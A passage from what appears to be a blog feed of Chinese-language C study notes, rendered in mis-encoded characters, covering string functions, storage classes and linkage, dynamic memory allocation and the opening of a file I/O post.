class="hljs-keyword">if</span> (st[i] == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>st[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">while</span> (getchar() != <span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">return</span> ret_val;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>scanf()</strong></p><p>å¸¸ç”¨ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„</p><h3 id="å­—ç¬¦ä¸²è¾“å‡º"><a href="#å­—ç¬¦ä¸²è¾“å‡º" class="headerlink" title="å­—ç¬¦ä¸²è¾“å‡º"></a>å­—ç¬¦ä¸²è¾“å‡º</h3><p><strong>puts()ä¸sprintf()</strong></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920165617542.png" alt="image-20210920165617542"></p><p><strong>fputs()</strong></p><p><code>fputs()</code>ï¼šå®ƒçš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šéœ€è¦å†™å…¥çš„æ–‡ä»¶ä½ç½®ï¼Œå¦‚æœæ˜¯è¾“å‡ºçš„è¯å°±æ˜¯<code>stdout</code>å®ƒä¸ä¼šåœ¨æœ«å°¾æ·»åŠ æ¢è¡Œç¬¦</p><p><strong>printf()</strong></p><p>å¸¸ç”¨çš„æ‰“å°å‡½æ•°</p><h3 id="å­—ç¬¦ä¸²å‡½æ•°"><a href="#å­—ç¬¦ä¸²å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å‡½æ•°"></a>å­—ç¬¦ä¸²å‡½æ•°</h3><p><strong>strlen()</strong></p><p><code>strlen()</code> ç»Ÿè®¡å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¿½ç•¥æœ«å°¾çš„ <code>\0</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920180046351.png" alt="image-20210920180046351"></p><p><strong>strcat() strncat()</strong></p><p><code>strcat()</code>ï¼šå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºéœ€è¦æ‹¼æ¥çš„å‚æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯æ‹¼æ¥ä¸Šçš„å­—ç¬¦ä¸²ï¼Œæ— æ³•æ£€æµ‹ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦å¯ä»¥å®¹çº³ç¬¬äºŒä¸ªå‚æ•°ã€‚</p><p><code>strncat()</code>ï¼šè¯¥å‡½æ•°çš„ç¬¬3 ä¸ªå‚æ•°æŒ‡å®šäº†æœ€å¤§æ·»åŠ å­—ç¬¦æ•°</p><p><strong>strcmp()</strong></p><p><code>strcmp()</code> å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°</p><blockquote><p><code>strcmp()</code>å‡½æ•°æ¯”è¾ƒçš„æ˜¯å­—ç¬¦ä¸²ï¼Œä¸æ˜¯å­—ç¬¦ï¼Œæ‰€ä»¥å…¶å‚æ•°åº”è¯¥æ˜¯å­—ç¬¦ä¸²</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181023733.png" alt="image-20210920181023733"></p><p><strong>strncmp()</strong></p><p><code>strcmp()</code>å‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œç›´åˆ°å‘ç°ä¸åŒçš„å­—ç¬¦ä¸ºæ­¢ï¼Œè¿™ä¸€è¿‡ ç¨‹å¯èƒ½ä¼šæŒç»­åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œå®ƒå¯ä»¥è®¾ç½®æ¯”è¾ƒåˆ°å“ªä¸€ä½æˆªè‡³ã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210920181409653.png" alt="image-20210920181409653"></p><p>  <strong>strcpy()  strncpy()</strong></p><p><code>strcpy()</code> </p><ul><li><code>strcpy()</code>ï¼šè¿”å›ç±»å‹æ˜¯ <code>char *</code>ï¼Œè¯¥å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªå‚æ•°çš„å€¼å³ç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€</li><li>ç¬¬ä¸€ä¸ªå‚æ•°ä¸å¿…æŒ‡å‘æ•°ç»„çš„å¼€å§‹ï¼Œè¿™ä¸ªå±æ€§å¯ç”¨äºæ‹·è´æ•°ç»„çš„ä¸€éƒ¨åˆ†</li><li><code>strcpy()</code>æŠŠæºå­—ç¬¦ä¸²ä¸­çš„<strong>ç©ºå­—ç¬¦ä¹Ÿæ‹·è´åœ¨å†…</strong></li></ul><p><code>strncpy()</code></p><p><code>strcpy()</code>å’Œ <code>strcat()</code>éƒ½æœ‰åŒæ ·çš„é—®é¢˜ï¼Œå®ƒä»¬éƒ½ä¸èƒ½æ£€æŸ¥ç›®æ ‡ç©ºé—´æ˜¯å¦èƒ½å®¹ çº³æºå­—ç¬¦ä¸²çš„å‰¯æœ¬ï¼Œ<code>strncpy()</code> è¯¥å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æŒ‡æ˜å¯ä»¥æ‹·è´çš„æœ€å¤§å­—ç¬¦ä¸²ã€‚</p><h3 id="å‘½ä»¤è¡Œè¾“å…¥"><a href="#å‘½ä»¤è¡Œè¾“å…¥" class="headerlink" title="å‘½ä»¤è¡Œè¾“å…¥"></a>å‘½ä»¤è¡Œè¾“å…¥</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// argc è¡¨ç¤ºå‚æ•°ä¸ªæ•°</span><br><span class="hljs-comment">// argv[] å‚æ•°æ•°ç»„</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Cå­¦ä¹ &quot;&gt;&lt;a href=&quot;#Cå­¦ä¹ &quot; class=&quot;headerlink&quot; title=&quot;Cå­¦ä¹ &quot;&gt;&lt;/a&gt;Cå­¦ä¹ &lt;/h1&gt;&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;å‡½æ•°&quot;&gt;&lt;a href=&quot;#å‡½æ•°&quot; class=&quot;headerlink&quot; title=&quot;å‡½æ•°&quot;&gt;</summary>
      
    
    
    
    <category term="ç¼–ç¨‹è¯­è¨€" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>å­˜å‚¨ç±»åˆ« é“¾æ¥å’Œå†…å­˜ç®¡ç†</title>
    <link href="http://example.com/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://example.com/2021/09/21/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</id>
    <published>2021-09-21T12:37:58.000Z</published>
    <updated>2021-09-21T14:25:15.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†"><a href="#å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†" class="headerlink" title="å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†"></a>å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†</h1><p>è¢«å­˜å‚¨çš„æ¯ä¸ªå€¼éƒ½å æœ‰ä¸€å®šçš„ç‰©ç†å†…å­˜ï¼ŒC è¯­è¨€æŠŠè¿™æ ·çš„ä¸€å—å†…å­˜ç§°ä¸ºå¯¹è±¡ã€‚</p><p>å¯¹è±¡å¯ä»¥å­˜å‚¨ä¸€ä¸ªæˆ–è€…å¤šä¸ªå€¼ï¼Œä¸€ä¸ªå¯¹è±¡å¯èƒ½å¹¶æœªå­˜å‚¨å®é™…çš„å€¼ï¼Œä½†æ˜¯å®ƒå­˜å‚¨å®é™…çš„å€¼æ—¶ä¸€å®šå…·æœ‰ç›¸åº”çš„å¤§å°</p><h2 id="å­˜å‚¨ç±»åˆ«"><a href="#å­˜å‚¨ç±»åˆ«" class="headerlink" title="å­˜å‚¨ç±»åˆ«"></a>å­˜å‚¨ç±»åˆ«</h2><h3 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h3><p>Cçš„ä½œç”¨åŸŸï¼š</p><ul><li>å—ä½œç”¨åŸŸï¼š<code>&#123; &#125;</code></li><li>å‡½æ•°ä½œç”¨åŸŸï¼šä»…ç”¨äºå‡½æ•°çš„ <code>goto</code> æ ‡ç­¾</li><li>å‡½æ•°åŸå‹ä½œç”¨åŸŸï¼šå‡½æ•°çš„å½¢å‚</li><li>æ–‡ä»¶ä½œç”¨åŸŸï¼šå£°æ˜åœ¨æœ€å¼€å§‹çš„å˜é‡</li></ul><h3 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h3><p>C å˜é‡æœ‰ 3 ç§é“¾æ¥å±æ€§ï¼š</p><ul><li>å¤–éƒ¨é“¾æ¥</li><li>å†…éƒ¨é“¾æ¥</li><li>æ— é“¾æ¥</li></ul><p>å…·æœ‰<strong>å—ä½œç”¨åŸŸã€å‡½æ•°ä½œç”¨åŸŸæˆ–å‡½æ•°åŸå‹ä½œç”¨åŸŸ</strong>çš„å˜é‡éƒ½æ˜¯æ— é“¾æ¥å˜é‡ï¼Œè¿™æ„å‘³ç€è¿™äº›å˜é‡å±äºå®šä¹‰å®ƒä»¬çš„å—ã€å‡½æ•°æˆ–åŸå‹ç§æœ‰ã€‚</p><p>å…·æœ‰<strong>æ–‡ä»¶ä½œç”¨åŸŸçš„å˜é‡å¯ä»¥æ˜¯å¤–éƒ¨é“¾æ¥æˆ–å†…éƒ¨é“¾æ¥</strong>ã€‚<strong>å¤–éƒ¨é“¾æ¥</strong>å˜é‡å¯ä»¥åœ¨<strong>å¤šæ–‡ä»¶ç¨‹åºä¸­</strong>ä½¿ç”¨ï¼Œ<strong>å†…éƒ¨é“¾æ¥</strong>å˜é‡åªèƒ½åœ¨ä¸€ä¸ª<strong>ç¿»è¯‘å•å…ƒ</strong>ä¸­ä½¿ç”¨ã€‚</p><blockquote><p>ç¼–è¯‘å™¨æºä»£ç æ–‡ä»¶å’Œæ‰€æœ‰çš„å¤´æ–‡ä»¶éƒ½çœ‹æˆæ˜¯ä¸€ä¸ªåŒ…å«ä¿¡æ¯çš„å•ç‹¬æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶è¢«ç§°ä¸ºç¿»è¯‘å•å…ƒ </p></blockquote><p>å†…éƒ¨é“¾æ¥çš„æ–‡ä»¶ä½œç”¨åŸŸç§°ä¸ºæ–‡ä»¶ä½œç”¨åŸŸ</p><p>å¤–éƒ¨é“¾æ¥çš„æ–‡ä»¶ä½œç”¨åŸŸç§°ä¸ºå…¨å±€ä½œç”¨åŸŸæˆ–è€…ç¨‹åºä½œç”¨åŸŸ</p><blockquote><p>å¦‚ä½•çŸ¥é“æ–‡ä»¶ä½œç”¨åŸŸå˜é‡æ˜¯å†…éƒ¨é“¾æ¥è¿˜æ˜¯å¤–éƒ¨é“¾æ¥ï¼Ÿå¯ä»¥æŸ¥çœ‹å¤–éƒ¨å®šä¹‰ ä¸­æ˜¯å¦ä½¿ç”¨äº†å­˜å‚¨ç±»åˆ«è¯´æ˜ç¬¦static</p><p><code>int giants = 5;  </code>         // æ–‡ä»¶ä½œç”¨åŸŸï¼Œå¤–éƒ¨é“¾æ¥ </p><p><code>static int dodgers = 3;</code>   // æ–‡ä»¶ä½œç”¨åŸŸï¼Œå†…éƒ¨é“¾æ¥</p><p>å¯¹äºæ–‡ä»¶ä½œç”¨åŸŸå˜é‡ï¼Œå…³é”®å­— staticè¡¨æ˜ äº†å…¶é“¾æ¥å±æ€§ï¼Œè€Œéå­˜å‚¨æœŸ</p></blockquote><h3 id="å­˜å‚¨æœŸ"><a href="#å­˜å‚¨æœŸ" class="headerlink" title="å­˜å‚¨æœŸ"></a>å­˜å‚¨æœŸ</h3><p>å­˜å‚¨æœŸæè¿°äº†é€šè¿‡è¿™äº›æ ‡è¯†ç¬¦è®¿é—®çš„å¯¹è±¡çš„ç”Ÿå­˜æœŸ</p><p>Cå¯¹è±¡æœ‰4ç§å­˜å‚¨æœŸï¼š</p><ul><li>é™æ€å­˜å‚¨æœŸï¼šç¨‹åºæ‰§è¡ŒæœŸé—´ä¸€ç›´å­˜åœ¨</li><li>çº¿ç¨‹å­˜å‚¨æœŸï¼šç”¨äºå¹¶å‘ç¨‹åºè®¾è®¡ï¼Œç¨‹åºæ‰§è¡Œå¯è¢«åˆ†ä¸ºå¤šä¸ªçº¿ç¨‹ï¼Œå…·æœ‰çº¿ç¨‹ å­˜å‚¨æœŸçš„å¯¹è±¡ï¼Œä»è¢«å£°æ˜æ—¶åˆ°çº¿ç¨‹ç»“æŸä¸€ç›´å­˜åœ¨</li><li>è‡ªåŠ¨å­˜å‚¨æœŸï¼šå—ä½œç”¨åŸŸçš„å˜é‡é€šå¸¸å…·æœ‰è‡ªåŠ¨å­˜å‚¨æœŸï¼Œå½“ç¨‹åºè¿›å…¥å®šä¹‰è¿™äº›å˜é‡çš„å— æ—¶ï¼Œä¸ºè¿™äº›å˜é‡åˆ†é…å†…å­˜ï¼›å½“é€€å‡ºè¿™ä¸ªå—æ—¶ï¼Œé‡Šæ”¾åˆšæ‰ä¸ºå˜é‡åˆ†é…çš„å†…å­˜</li><li>åŠ¨æ€åˆ†é…å­˜å‚¨æœŸ</li></ul><h3 id="å­˜å‚¨ç±»åˆ«-1"><a href="#å­˜å‚¨ç±»åˆ«-1" class="headerlink" title="å­˜å‚¨ç±»åˆ«"></a>å­˜å‚¨ç±»åˆ«</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921135941036.png" alt="image-20210921135941036"></p><p><strong>è‡ªåŠ¨å˜é‡</strong></p><p>é»˜è®¤æƒ… å†µä¸‹ï¼Œå£°æ˜åœ¨å—æˆ–å‡½æ•°å¤´ä¸­çš„ä»»ä½•å˜é‡éƒ½å±äºè‡ªåŠ¨å­˜å‚¨ç±»åˆ«ï¼Œå˜é‡å…·æœ‰è‡ªåŠ¨å­˜å‚¨æœŸæ„å‘³ç€ï¼Œç¨‹åºåœ¨è¿›å…¥è¯¥å˜é‡å£°æ˜æ‰€åœ¨çš„å—æ—¶å˜é‡å­˜åœ¨ï¼Œç¨‹åºåœ¨é€€å‡ºè¯¥å—æ—¶å˜é‡æ¶ˆå¤±</p><blockquote><p>å—ä½œç”¨åŸŸå’Œæ— é“¾æ¥æ„å‘³ç€åªæœ‰åœ¨å˜é‡å®šä¹‰æ‰€åœ¨çš„å—ä¸­æ‰èƒ½é€šè¿‡å˜é‡åè®¿é—®è¯¥å˜é‡</p></blockquote><p>å¦‚æœå†…å±‚å—ä¸­å£°æ˜çš„å˜é‡ä¸å¤–å±‚å—ä¸­çš„å˜é‡åŒåä¼šæ€æ ·ï¼Ÿå†…å±‚å—ä¼šéšè— å¤–å±‚å—çš„å®šä¹‰ã€‚ä½†æ˜¯ç¦»å¼€å†…å±‚å—åï¼Œå¤–å±‚å—å˜é‡çš„ä½œç”¨åŸŸåˆå›åˆ°äº†åŸæ¥çš„ä½œ ç”¨åŸŸ</p><p><strong>å¯„å­˜å™¨å˜é‡</strong></p><p>å¯„å­˜å™¨å˜é‡å­˜å‚¨åœ¨å¯„å­˜å™¨è€Œä¸æ˜¯åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥æ— æ³•è·å–åˆ°å¯„å­˜å™¨å˜é‡çš„åœ°å€ï¼Œä¸æ™®é€šå˜é‡ç›¸æ¯”è®¿é—®å’Œå¤„ç†çš„é€Ÿåº¦è¾ƒå¿«ï¼Œå¤§å¤šæ•°æ–¹é¢å¯„å­˜å™¨å˜é‡å’Œè‡ªåŠ¨å˜é‡éƒ½ä¸€æ ·ï¼Œä½¿ç”¨<code>register</code> æ¥å£°æ˜å¯„å­˜å™¨å˜é‡</p><blockquote><p>å¯å£°æ˜ä¸ºregisterçš„æ•°æ®ç±»å‹æœ‰é™</p></blockquote><h3 id="å—ä½œç”¨åŸŸçš„é™æ€å˜é‡"><a href="#å—ä½œç”¨åŸŸçš„é™æ€å˜é‡" class="headerlink" title="å—ä½œç”¨åŸŸçš„é™æ€å˜é‡"></a>å—ä½œç”¨åŸŸçš„é™æ€å˜é‡</h3><p>é™æ€çš„æ„æ€æ˜¯è¯¥å˜é‡åœ¨å†…å­˜ä¸­çš„åœ°å€ä¸å˜ã€‚å…·æœ‰æ–‡ä»¶ä½œç”¨åŸŸçš„å˜é‡è‡ªåŠ¨å…·æœ‰é™æ€å­˜å‚¨æœŸã€‚â€œå±€éƒ¨é™æ€å˜é‡â€æ˜¯æè¿°å…·æœ‰å—ä½œç”¨åŸŸçš„é™æ€å˜é‡çš„å¦ä¸€ä¸ªæœ¯è¯­</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921141811428.png" alt="image-20210921141811428"></p><h3 id="å¤–éƒ¨é“¾æ¥çš„é™æ€å˜é‡"><a href="#å¤–éƒ¨é“¾æ¥çš„é™æ€å˜é‡" class="headerlink" title="å¤–éƒ¨é“¾æ¥çš„é™æ€å˜é‡"></a>å¤–éƒ¨é“¾æ¥çš„é™æ€å˜é‡</h3><p>å¤–éƒ¨é“¾æ¥çš„é™æ€å˜é‡å…·æœ‰æ–‡ä»¶ä½œç”¨åŸŸã€å¤–éƒ¨é“¾æ¥å’Œé™æ€å­˜å‚¨æœŸ</p><p>å˜é‡çš„å®šä¹‰æ€§å£°æ˜ï¼ˆdefining declarationï¼‰æ”¾ åœ¨åœ¨æ‰€æœ‰å‡½æ•°çš„å¤–é¢ä¾¿åˆ›å»ºäº†å¤–éƒ¨å˜é‡ï¼Œä¸ºäº†æŒ‡å‡ºè¯¥å‡½æ•°ä½¿ç”¨äº†å¤–éƒ¨ å˜é‡ï¼Œå¯ä»¥åœ¨å‡½æ•°ä¸­ç”¨å…³é”®å­—externå†æ¬¡å£°æ˜</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> str1;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921142443122.png" alt="image-20210921142443122"></p><h3 id="å†…éƒ¨é“¾æ¥çš„é™æ€å˜é‡"><a href="#å†…éƒ¨é“¾æ¥çš„é™æ€å˜é‡" class="headerlink" title="å†…éƒ¨é“¾æ¥çš„é™æ€å˜é‡"></a>å†…éƒ¨é“¾æ¥çš„é™æ€å˜é‡</h3><p>é™æ€å­˜å‚¨æœŸã€æ–‡ä»¶ä½œç”¨åŸŸå’Œå†…éƒ¨é“¾æ¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">static <span class="hljs-built_in">int</span> svil = <span class="hljs-number">1</span>; <span class="hljs-comment">// é™æ€å˜é‡ï¼Œå†…éƒ¨é“¾æ¥</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143327517.png" alt="image-20210921143327517"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921143941199.png" alt="image-20210921143941199"></p><h3 id="å†…å­˜åˆ†é…"><a href="#å†…å­˜åˆ†é…" class="headerlink" title="å†…å­˜åˆ†é…"></a>å†…å­˜åˆ†é…</h3><p><code>malloc()</code>ï¼šè¯¥å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œé‚£å°±æ˜¯éœ€è¦ç”³è¯·çš„å†…å­˜å­—èŠ‚æ•°ï¼Œå®ƒä¼šæ‰¾ä¸€ä¸ªåˆé€‚çš„å†…å­˜ç©ºé—²å—ï¼Œç”³è¯·ä¸€å—åŒ¿ååœ°å€ï¼Œè¿”å›å†…å­˜åœ°å€çš„é¦–å­—èŠ‚åœ°å€ã€‚å¯ä»¥å°†è¿”å›å€¼èµ‹å€¼ç»™æŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨æŒ‡é’ˆè®¿é—®è¿™å—åœ°å€ã€‚</p><p><code>free()</code>ï¼šé‡Šæ”¾ä¹‹å‰ç”³è¯·çš„åœ°å€ï¼Œ<strong>ç”³è¯·åä¸€å®šè¦è®°å¾—é‡Šæ”¾</strong></p><blockquote><p><code>void* p</code> æŒ‡å‘ void çš„æŒ‡é’ˆï¼Œè¡¨ç¤ºé€šç”¨æŒ‡é’ˆ</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921150438063.png" alt="image-20210921150438063"></p><p><code>calloc()</code>ï¼šæ¥å—ä¸¤ä¸ªæ— ç¬¦å·æ•´æ•°ä½œä¸ºå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å­˜å‚¨å•å…ƒç±»å‹çš„æ•°é‡ï¼Œç¬¬äºŒä¸ªæ¯ä¸ªæ˜¯å­˜å‚¨å•å…ƒçš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰</p><p><code>calloc()</code>å‡½æ•°è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼šå®ƒæŠŠå—ä¸­çš„æ‰€æœ‰ä½éƒ½è®¾ç½®ä¸º0ï¼Œ<code>calloc()</code>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>free()</code>æ¥é‡Šæ”¾</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†&quot;&gt;&lt;a href=&quot;#å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†&quot; class=&quot;headerlink&quot; title=&quot;å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†&quot;&gt;&lt;/a&gt;å­˜å‚¨ç±»åˆ«ã€é“¾æ¥å’Œå†…å­˜ç®¡ç†&lt;/h1&gt;&lt;p&gt;è¢«å­˜å‚¨çš„æ¯ä¸ªå€¼éƒ½å æœ‰ä¸€å®šçš„ç‰©ç†å†…å­˜ï¼ŒC è¯­è¨€æŠŠè¿™æ ·çš„ä¸€å—å†…å­˜</summary>
      
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶æ“ä½œ</title>
    <link href="http://example.com/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2021/09/21/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2021-09-21T08:37:58.000Z</published>
    <updated>2021-09-21T14:05:12.382Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h1><p>ä»æ–‡ä»¶è¯»å–ä¿¡æ¯æˆ–è€…å°†ä¿¡æ¯å†™å…¥æ–‡ä»¶ï¼Œè¿™ç§ç¨‹åºä¸æ–‡ä»¶çš„äº¤äº’å½¢å¼å°±æ˜¯æ–‡ä»¶é‡å®šå‘</p><h2 id="ä¸æ–‡ä»¶é€šä¿¡"><a href="#ä¸æ–‡ä»¶é€šä¿¡" class="headerlink" title="ä¸æ–‡ä»¶é€šä¿¡"></a>ä¸æ–‡ä»¶é€šä¿¡</h2><p>æ–‡ä»¶ï¼šé€šå¸¸æ˜¯å·²ç»å­˜å‚¨åœ¨ç£ç›˜æˆ–å›ºæ€ç¡¬ç›˜ä¸Šçš„ä¸€æ®µå·²å‘½åçš„å­˜å‚¨åŒºã€‚</p><p>C æŠŠæ–‡ä»¶çœ‹æˆä¸€ç³»åˆ—è¿ç»­çš„å­—èŠ‚ï¼Œæ¯ä¸ªå­—èŠ‚å¯ä»¥è¢«å•ç‹¬è¯»å–ï¼ŒCæä¾›ä¸¤ç§æ–‡ä»¶æ¨¡å¼ï¼šæ–‡æœ¬æ¨¡å¼å’ŒäºŒè¿›åˆ¶æ¨¡å¼</p><h3 id="æ–‡æœ¬æ¨¡å¼-äºŒè¿›åˆ¶æ¨¡å¼"><a href="#æ–‡æœ¬æ¨¡å¼-äºŒè¿›åˆ¶æ¨¡å¼" class="headerlink" title="æ–‡æœ¬æ¨¡å¼ äºŒè¿›åˆ¶æ¨¡å¼"></a>æ–‡æœ¬æ¨¡å¼ äºŒè¿›åˆ¶æ¨¡å¼</h3><p><strong>æ–‡ä»¶çš„å†…å®¹éƒ½ä»¥äºŒè¿›åˆ¶å½¢å¼ï¼ˆ0æˆ–1ï¼‰å‚¨å­˜</strong>ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ–‡ä»¶æœ€åˆ<strong>ä½¿ç”¨äºŒè¿›åˆ¶ç¼–ç çš„å­—ç¬¦</strong>ï¼ˆä¾‹å¦‚ï¼Œ ASCIIæˆ–Unicodeï¼‰è¡¨ç¤ºæ–‡æœ¬ï¼ˆå°±åƒCå­—ç¬¦ä¸²é‚£æ ·ï¼‰ï¼Œè¯¥æ–‡ä»¶å°±æ˜¯<strong>æ–‡æœ¬æ–‡ä»¶</strong>ï¼Œå…¶ä¸­åŒ…å«æ–‡æœ¬å†…å®¹ã€‚å¦‚æœæ–‡ä»¶ä¸­çš„<strong>äºŒè¿›åˆ¶å€¼ä»£ è¡¨æœºå™¨è¯­è¨€ä»£ç æˆ–æ•°å€¼æ•°æ®</strong>ï¼ˆä½¿ç”¨ç›¸åŒçš„å†…éƒ¨è¡¨ç¤ºï¼Œå‡è®¾ï¼Œç”¨äºlongæˆ– doubleç±»å‹çš„å€¼ï¼‰æˆ–<strong>å›¾ç‰‡æˆ–éŸ³ä¹ç¼–ç </strong>ï¼Œè¯¥æ–‡ä»¶å°±æ˜¯<strong>äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œå…¶ä¸­åŒ…å«äºŒè¿›åˆ¶å†…å®¹ã€‚</p><p>åœ¨äºŒè¿›åˆ¶æ¨¡å¼ä¸­ï¼Œç¨‹åºå¯ä»¥è®¿é—®æ–‡ä»¶çš„æ¯ä¸ªå­—èŠ‚ã€‚è€Œåœ¨æ–‡æœ¬æ¨¡å¼ ä¸­ï¼Œç¨‹åºæ‰€è§çš„å†…å®¹å’Œæ–‡ä»¶çš„å®é™…å†…å®¹ä¸åŒã€‚ç¨‹åºä»¥æ–‡æœ¬æ¨¡å¼è¯»å–æ–‡ä»¶æ—¶ï¼Œ æŠŠæœ¬åœ°ç¯å¢ƒè¡¨ç¤ºçš„è¡Œæœ«å°¾æˆ–æ–‡ä»¶ç»“å°¾æ˜ å°„ä¸ºCæ¨¡å¼ã€‚</p><h3 id="I-O-çš„çº§åˆ«"><a href="#I-O-çš„çº§åˆ«" class="headerlink" title="I/O çš„çº§åˆ«"></a>I/O çš„çº§åˆ«</h3><p>é™¤äº†é€‰æ‹©æ–‡ä»¶çš„æ¨¡å¼ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿˜å¯ä»¥é€‰æ‹© I/O çš„ä¸¤ä¸ªçº§åˆ«ï¼ˆå³ å¤„ç†æ–‡ä»¶è®¿é—®çš„ä¸¤ä¸ªçº§åˆ«ï¼‰ã€‚åº•å±‚I/Oï¼ˆlow-level I/Oï¼‰ä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„ åŸºæœ¬ I/O æœåŠ¡ã€‚æ ‡å‡†é«˜çº§ I/Oï¼ˆstandard high-level I/Oï¼‰ä½¿ç”¨ C åº“çš„æ ‡å‡†åŒ…å’Œ stdio.h å¤´æ–‡ä»¶å®šä¹‰ã€‚å› ä¸ºæ— æ³•ä¿è¯æ‰€æœ‰çš„æ“ä½œç³»ç»Ÿéƒ½ä½¿ç”¨ç›¸åŒçš„åº•å±‚ I/O æ¨¡å‹ï¼ŒC æ ‡å‡†åªæ”¯æŒæ ‡å‡†I/O åŒ…ã€‚æœ‰äº›å®ç°ä¼šæä¾›åº•å±‚åº“ï¼Œä½†æ˜¯ C æ ‡å‡†å»ºç«‹äº†å¯ ç§»æ¤çš„ I/O æ¨¡å‹ï¼Œæˆ‘ä»¬ä¸»è¦è®¨è®ºè¿™äº› I/Oã€‚</p><h3 id="æ ‡å‡†æ–‡ä»¶"><a href="#æ ‡å‡†æ–‡ä»¶" class="headerlink" title="æ ‡å‡†æ–‡ä»¶"></a>æ ‡å‡†æ–‡ä»¶</h3><p>C ç¨‹åºä¼šè‡ªåŠ¨æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶ï¼Œæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯è¾“å‡º</p><h2 